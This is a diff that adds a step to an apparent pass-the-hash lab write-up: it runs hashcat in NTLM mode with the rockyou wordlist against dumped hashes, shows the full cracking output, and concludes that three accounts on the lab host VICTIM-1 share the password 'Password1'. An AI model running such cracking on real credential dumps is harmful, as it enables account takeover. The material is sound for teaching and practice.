@@ -210,4 +210,48 @@ Opened a file and dropped in the hashes I want to crack and use:
 ```bash
 nano passthehash.txt
 ```
+
+## Step 4 — Crack the Hashes With Hashcat
+
+Run:
+
+```bash
+hashcat -m 1000 passthehash.txt /usr/share/wordlists/rockyou.txt
+```
+-m 1000 tells hashcat these are NTLM hashes.
+
+Results:
+
+```
+64f12cddaa88057e06a81b54e73b949b:Password1                
+31d6cfe0d16ae931b73c59d7e0c089c0:                         
+Approaching final keyspace - workload adjusted.           
+
+                                                          
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: passthehash.txt
+Time.Started.....: Thu May 28 14:17:14 2026 (8 secs)
+Time.Estimated...: Thu May 28 14:17:22 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  1848.3 kH/s (0.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 2/4 (50.00%) Digests (total), 2/4 (50.00%) Digests (new)
+Progress.........: 14344387/14344387 (100.00%)
+Rejected.........: 0/14344387 (0.00%)
+Restore.Point....: 14344387/14344387 (100.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...:  laylanie -> $HEX[042a0337c2a156616d6f732103]
+Hardware.Mon.#01.: Util: 23%
+```
+
+Password1 is the password behind 64f12cdd... — so Administrator on VICTIM-1, rahim, and karim all use Password1
+
+<p align="center">
+  <img src="/writeups/pass the hash/images/step4-1.png" width="600">
+</p>
+
                                                                                 
